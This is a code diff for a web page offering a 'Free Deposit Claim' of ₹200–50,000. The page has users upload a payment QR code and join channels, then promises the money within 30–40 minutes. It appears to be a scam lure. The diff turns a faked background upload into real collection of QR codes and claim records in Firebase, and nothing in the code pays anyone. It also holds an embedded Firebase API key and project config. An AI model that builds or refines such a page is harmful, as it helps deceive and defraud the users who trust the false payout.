@@ -183,10 +183,13 @@
             background-color: rgba(0, 255, 136, 0.1);
         }
         
+        .qr-upload-box.uploading, .qr-upload-box.uploaded {
+            cursor: not-allowed;
+        }
+        
         .qr-upload-box.uploaded {
             border-color: #00ff88;
             border-style: solid;
-            cursor: not-allowed;
         }
 
         .qr-upload-box .icon { font-size: 32px; color: var(--primary-glow); }
@@ -299,11 +302,9 @@
 
     <div class="animated-bg"></div>
 
-    <!-- PAGE 1 is unchanged -->
     <div id="page1" class="main-container page active">
         <h2 class="heading"><i class="fa-solid fa-credit-card"></i>Free Deposit Claim</h2>
         <p class="sub-heading">Select or enter an amount to claim</p>
-
         <div class="amount-grid">
             <button class="amount-btn" data-amount="200">₹200</button>
             <button class="amount-btn" data-amount="500">₹500</button>
@@ -312,35 +313,28 @@
             <button class="amount-btn" data-amount="2000">₹2K</button>
             <button class="amount-btn" data-amount="3000">₹3K</button>
         </div>
-
         <div class="input-group">
             <i class="fa-solid fa-indian-rupee-sign icon"></i>
             <input type="number" id="amount-input" class="input-field" placeholder="Enter Amount (200-50000)">
         </div>
-
         <button id="proceed-btn" class="primary-btn">Proceed to Claim</button>
     </div>
 
-    <!-- PAGE 2 HTML is unchanged -->
     <div id="page2" class="main-container page">
         <h2 class="heading">Claim Your Reward</h2>
         <p class="sub-heading">Upload QR & Join all channels to unlock.</p>
-        
         <div id="qr-upload-box" class="qr-upload-box">
             <div class="icon"><i class="fa-solid fa-qrcode"></i></div>
             <p id="qr-upload-status">Upload Payment QR Code</p>
             <small>Accepted: JPG, PNG, JPEG</small>
         </div>
         <input type="file" id="qr-file-input" style="display: none;" accept="image/jpeg, image/png, image/jpg" />
-
         <p class="sub-heading" style="text-align: center; margin-bottom: 10px;">Complete Tasks</p>
         <div id="task-list" class="task-list"></div>
-
         <button id="submit-claim-btn" class="primary-btn" disabled>Submit Claim</button>
         <button id="go-back-btn" class="secondary-btn">Go Back</button>
     </div>
 
-    <!-- MODALS are unchanged -->
     <div id="processing-modal" class="modal-overlay">
         <div class="modal-content">
             <div class="loader"></div>
@@ -358,27 +352,29 @@
         </div>
     </div>
 
-    <!-- Firebase SDKs are unchanged -->
+    <!-- Firebase SDKs -->
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-storage.js"></script>
 
     <script>
+        // --- THIS IS YOUR FIREBASE CONFIG ---
         const firebaseConfig = {
-        const firebaseConfig = {
-  apiKey: "AIzaSyC661J11t-9Prs_QvgFJvDMOKXlcXkddvQ",
-  authDomain: "selling-phx.firebaseapp.com",
-  databaseURL: "https://selling-phx-default-rtdb.firebaseio.com",
-  projectId: "selling-phx",
-  storageBucket: "selling-phx.firebasestorage.app",
-  messagingSenderId: "62050774437",
-  appId: "1:62050774437:web:e9fc1087bb19990b994c4c"
-};
+            apiKey: "AIzaSyC661J11t-9Prs_QvgFJvDMOKXlcXkddvQ",
+            authDomain: "selling-phx.firebaseapp.com",
+            databaseURL: "https://selling-phx-default-rtdb.firebaseio.com",
+            projectId: "selling-phx",
+            storageBucket: "selling-phx.appspot.com", // Corrected storage bucket URL
+            messagingSenderId: "62050774437",
+            appId: "1:62050774437:web:e9fc1087bb19990b994c4c"
+        };
+        
+        // --- INITIALIZE FIREBASE ---
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
         const storage = firebase.storage();
 
-        // DOM Elements are unchanged
+        // DOM Elements
         const page1 = document.getElementById('page1');
         const page2 = document.getElementById('page2');
         const amountInput = document.getElementById('amount-input');
@@ -399,8 +395,9 @@
         let selectedAmount = 0;
         let finalRedirectUrl = "#";
         let isQrUploaded = false;
+        let uploadedQrUrl = null; // Variable to store the uploaded QR code URL
 
-        // Page navigation logic is unchanged
+        // Page navigation logic
         const goToPage2 = () => {
             selectedAmount = amountInput.value || 0;
             if (selectedAmount < 200 || selectedAmount > 50000) {
@@ -414,11 +411,13 @@
         const goToPage1 = () => {
             page2.classList.remove('active');
             page1.classList.add('active');
+            // Reset page 2 state
             taskList.innerHTML = '';
             submitClaimBtn.disabled = true;
             isQrUploaded = false;
+            uploadedQrUrl = null;
             qrUploadStatus.textContent = "Upload Payment QR Code";
-            qrUploadBox.classList.remove('uploaded');
+            qrUploadBox.classList.remove('uploaded', 'uploading');
             qrFileInput.value = '';
         };
 
@@ -436,10 +435,12 @@
         amountInput.addEventListener('input', () => { amountBtns.forEach(b => b.classList.remove('active')); });
 
         qrUploadBox.addEventListener('click', () => {
-            if (!qrUploadBox.classList.contains('uploaded')) { qrFileInput.click(); }
+            if (!qrUploadBox.classList.contains('uploaded') && !qrUploadBox.classList.contains('uploading')) { 
+                qrFileInput.click(); 
+            }
         });
 
-        // --- THIS IS THE ONLY PART THAT HAS CHANGED ---
+        // --- UPDATED QR UPLOAD LOGIC ---
         qrFileInput.addEventListener('change', (e) => {
             const file = e.target.files[0];
             if (!file) return;
@@ -450,25 +451,43 @@
                 return;
             }
 
-            // 1. UPDATE UI IMMEDIATELY (INSTANT FEEDBACK)
-            qrUploadStatus.textContent = 'QR Code Uploaded! ✅';
-            qrUploadBox.classList.add('uploaded');
-            isQrUploaded = true;
-            checkAllTasksCompleted();
+            // Update UI to show upload is in progress
+            qrUploadStatus.textContent = 'Uploading QR Code...';
+            qrUploadBox.classList.add('uploading');
 
-            // 2. START THE REAL UPLOAD IN THE BACKGROUND
             const storageRef = storage.ref(`qrcodes/${Date.now()}_${file.name}`);
             const uploadTask = storageRef.put(file);
 
-            // We can listen for errors in the background for debugging, but the user doesn't see this
-            uploadTask.catch((error) => {
-                console.error("Background upload failed:", error);
-                // We don't show an error to the user because they have already moved on.
-            });
+            uploadTask.on('state_changed',
+                (snapshot) => {
+                    // You can add a progress bar here if needed
+                },
+                (error) => {
+                    // Handle unsuccessful uploads
+                    console.error("Upload failed:", error);
+                    alert("QR Code upload failed. Please try again.");
+                    qrUploadStatus.textContent = 'Upload Failed! Retry.';
+                    qrUploadBox.classList.remove('uploading');
+                },
+                () => {
+                    // Handle successful uploads on complete
+                    uploadTask.snapshot.ref.getDownloadURL().then((downloadURL) => {
+                        console.log('File available at', downloadURL);
+                        uploadedQrUrl = downloadURL; // Save the URL
+                        isQrUploaded = true;
+                        
+                        // Update UI to show success
+                        qrUploadStatus.textContent = 'QR Code Uploaded! ✅';
+                        qrUploadBox.classList.remove('uploading');
+                        qrUploadBox.classList.add('uploaded');
+                        
+                        checkAllTasksCompleted(); // Check if submit button can be enabled
+                    });
+                }
+            );
         });
-        // --- END OF THE CHANGED SECTION ---
 
-        // Task logic is unchanged
+        // Task logic
         const loadTasks = () => {
             const channelsRef = database.ref('channels');
             const configRef = database.ref('config/closeUrl');
@@ -513,14 +532,37 @@
             }
         };
         
+        // --- UPDATED SUBMIT LOGIC ---
         submitClaimBtn.addEventListener('click', () => {
+            if (!uploadedQrUrl) {
+                alert("QR Code is still uploading or has failed. Please wait or try again.");
+                return;
+            }
+
             processingModal.classList.add('active');
+
+            // Create a data object to save to Firebase
+            const claimData = {
+                amount: selectedAmount,
+                qrCodeUrl: uploadedQrUrl,
+                status: 'pending',
+                timestamp: firebase.database.ServerValue.TIMESTAMP // Use server timestamp
+            };
             
-            setTimeout(() => {
-                processingModal.classList.remove('active');
-                successMessage.textContent = `Your deposit of ₹${selectedAmount} will be credited within 30-40 minutes.`;
-                successModal.classList.add('active');
-            }, 2500);
+            // Push the data to the 'claims' collection in the Realtime Database
+            database.ref('claims').push(claimData)
+                .then(() => {
+                    // Success
+                    processingModal.classList.remove('active');
+                    successMessage.textContent = `Your claim for ₹${selectedAmount} has been submitted. It will be credited within 30-40 minutes.`;
+                    successModal.classList.add('active');
+                })
+                .catch((error) => {
+                    // Error
+                    console.error("Error saving claim:", error);
+                    processingModal.classList.remove('active');
+                    alert("There was an error submitting your claim. Please try again.");
+                });
         });
 
         closeBtn.addEventListener('click', () => {
@@ -528,9 +570,9 @@
             if (finalRedirectUrl && finalRedirectUrl !== "#") {
                 window.location.href = finalRedirectUrl;
             }
-            goToPage1();
+            goToPage1(); // Reset to the first page after closing
         });
 
     </script>
 </body>
-</html>
+    </html>
